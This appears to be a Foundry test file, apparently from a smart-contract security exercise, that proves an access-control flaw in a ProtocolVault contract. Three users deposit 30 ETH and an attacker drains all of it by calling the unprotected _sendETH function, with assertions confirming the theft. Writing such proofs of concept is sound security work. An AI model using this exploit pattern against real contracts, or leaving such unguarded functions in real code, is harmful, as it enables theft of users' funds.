// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IProtocolVault {
    function withdrawETH() external;

    function owner() external returns (address);

    function _sendETH(address to) external;
}

/**
 * @dev run "forge test --match-contract AC1"
 */
contract TestAC1 is Test {
    IProtocolVault vault;

    uint128 public constant DEFAULT_BAL = 100 ether;

    uint128 public constant USER_DEPOSIT = 10 ether;

    uint256 init_attacker_bal;
    uint256 init_vault_bal;

    address deployer;
    address user1;
    address user2;
    address user3;
    address attacker;

    function setUp() public {
        deployer = address(1);
        user1 = address(2);
        user2 = address(3);
        user3 = address(4);
        attacker = address(5);
        vm.deal(user1, DEFAULT_BAL);
        vm.deal(user2, DEFAULT_BAL);
        vm.deal(user3, DEFAULT_BAL);
        vm.deal(attacker, DEFAULT_BAL);

        //Due to incompatible solidity versions (0.4 v/s 0.8), we are directly deploying the
        //compiled bytecode on blockchain on behalf of deployer using "deployCode"
        vm.startPrank(deployer);
        address _attack = deployCode("ProtocolVault.sol:ProtocolVault");
        vault = IProtocolVault(_attack);
        vm.stopPrank();

        //Users sending funds to the vault
        vm.prank(user1);
        (bool success1,) = address(vault).call{value: USER_DEPOSIT}("");
        require(success1, "Transfer failed");

        vm.prank(user2);
        (bool success2,) = address(vault).call{value: USER_DEPOSIT}("");
        require(success2, "Transfer failed");

        vm.prank(user3);
        (bool success3,) = address(vault).call{value: USER_DEPOSIT}("");
        require(success3, "Transfer failed");

        init_vault_bal = address(vault).balance;
        init_attacker_bal = address(attacker).balance;

        // Protocol Vault has 30 ETH, attacker has DEFAULT_BALANCE
        assertEq(init_vault_bal, USER_DEPOSIT * 3);
        assertEq(init_attacker_bal, DEFAULT_BAL);
    }

    function test_Attack() public {
        vm.prank(attacker);
        vault._sendETH(attacker);

        // Protocol Vault is empty and attacker has ~30+ ETH
        assertEq(address(vault).balance, 0);
        assertEq(address(attacker).balance, init_attacker_bal + (USER_DEPOSIT * 3));
    }
}
